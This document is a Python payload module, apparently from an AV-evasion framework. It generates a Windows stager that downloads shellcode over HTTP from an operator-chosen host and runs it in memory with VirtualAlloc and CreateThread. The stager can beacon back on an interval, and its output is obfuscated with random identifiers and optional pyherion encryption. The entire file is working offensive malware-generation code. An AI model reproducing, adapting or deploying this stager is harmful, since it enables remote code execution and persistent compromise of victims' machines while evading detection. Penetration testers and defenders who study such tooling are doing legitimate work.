"""
Downloads shellcode over HTTP and executes it in memory

Optionally beacons back every X seconds

Based on the PoC from @midnite_runr https://github.com/secretsquirrel/shellcode_retriever

Module by @byt3bl33d3r
"""

from modules.common import encryption
from modules.common import helpers


class Payload:

    def __init__(self):

        self.description = "Downloads shellcode over HTTP and executes it in memory"
        self.language = "python"
        self.rating = "Excellent"
        self.extension = "py"

        self.required_options = {
                                    "COMPILE_TO_EXE"  : ["Y", "Compile to an executable"],
                                    "USE_PYHERION"    : ["N", "Use the pyherion encrypter"],
                                    "DOWNLOAD_HOST"   : ["", "The host to download the shellcode from"],
                                    "DOWNLOAD_PORT"   : ["80", "The port on the host to download from"],
                                    "DOWNLOAD_NAME"   : ["runme.bin", "Name of the file to download"],
                                    "BEACON"          : ["N", "Optional: If the payload should beacon back"],
                                    "BEACON_SECONDS"  : ["3600", "Optional: BEACON interval"]
                                }

    def generate(self):

        imports = "import sys; import urllib2; import ctypes; import time; import signal; import threading\n"

        inject_func = helpers.randomString()
        getexec_func = helpers.randomString()
        main_func = helpers.randomString()
        beaconthr_func = helpers.randomString()

        retry_var = helpers.randomString()
        if self.required_options["BEACON"][0].lower() == 'n':
            global_vars = "%s = False" % retry_var
        elif self.required_options["BEACON"][0].lower() == 'y':
            global_vars = "%s = True" % retry_var

        interval_var = helpers.randomString()
        opener_var = helpers.randomString()

        global_vars += "\n%s = %s" % (interval_var, self.required_options["BEACON_SECONDS"][0])
        global_vars += "\n%s = urllib2.build_opener()\n" % (opener_var)

        shellcode_var = helpers.randomString()
        ptr_var = helpers.randomString()
        ht_var = helpers.randomString()
        buff_var = helpers.randomString()

        inject = "def %s(%s):" % (inject_func, shellcode_var)
        inject += "\n\t%s = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(%s)),ctypes.c_int(0x3000),ctypes.c_int(0x40))" % (ptr_var, shellcode_var)
        inject += "\n\tctypes.windll.kernel32.VirtualLock(ctypes.c_int(%s), ctypes.c_int(len(%s)))" % (ptr_var, shellcode_var)
        inject += "\n\t%s = (ctypes.c_char * len(%s)).from_buffer(%s)" % (buff_var, shellcode_var, shellcode_var)
        inject += "\n\tctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(%s), %s, ctypes.c_int(len(%s)))" % (ptr_var, buff_var, shellcode_var)
        inject += "\n\t%s = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(%s),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))" % (ht_var, ptr_var)
        inject += "\n\tctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(%s),ctypes.c_int(-1))\n" % ht_var

        url_var = helpers.randomString()
        shellcode_var = helpers.randomString()
        info_var = helpers.randomString()
        thread_var = helpers.randomString()
        thread_name = helpers.randomString()
        thread_name2 = helpers.randomString()

        getexec = "def %s(%s):" % (getexec_func, url_var)
        getexec += "\n\ttry:"
        getexec += "\n\t\t%s = %s.open(%s)" % (info_var, opener_var, url_var)
        getexec += "\n\t\t%s = %s.read()" % (shellcode_var, info_var)
        getexec += "\n\t\t%s = bytearray(%s)" % (shellcode_var, shellcode_var)
        getexec += "\n\t\t%s(%s)" % (inject_func, shellcode_var)
        getexec += "\n\texcept Exception:"
        getexec += "\n\t\tpass\n"

        url_var = helpers.randomString()

        beaconthr = "def %s(%s):" % (beaconthr_func, url_var)
        beaconthr += "\n\twhile True:"
        beaconthr += "\n\t\ttime.sleep(%s)" % interval_var
        beaconthr += "\n\t\t%s = threading.Thread(name='%s', target=%s, args=(%s,))" % (thread_var, thread_name, getexec_func, url_var)
        beaconthr += "\n\t\t%s.setDaemon(True)" % thread_var
        beaconthr += "\n\t\t%s.start()\n" % thread_var

        main = "def %s():" % main_func
        main += "\n\t%s = 'http://%s:%s/%s'" % (url_var, self.required_options['DOWNLOAD_HOST'][0], self.required_options['DOWNLOAD_PORT'][0], self.required_options['DOWNLOAD_NAME'][0])
        main += "\n\tif %s is True:" % retry_var
        main += "\n\t\t%s = threading.Thread(name='%s', target=%s, args=(%s,))" % (thread_var, thread_name, beaconthr_func, url_var)
        main += "\n\t\t%s.setDaemon(True)" % thread_var
        main += "\n\t\t%s.start()" % thread_var
        main += "\n\t%s(%s)" % (getexec_func, url_var)
        if self.required_options["BEACON"][0].lower() == 'y':
            main += "\n\twhile True:"
            main += "\n\t\ttime.sleep(0.1)"
        main += "\nif __name__ == '__main__':"
        main += "\n\t%s()" % main_func

        PayloadCode = imports + global_vars + inject + getexec + beaconthr + main

        if self.required_options["USE_PYHERION"][0].lower() == "y":
            PayloadCode = encryption.pyherion(PayloadCode)

        return PayloadCode
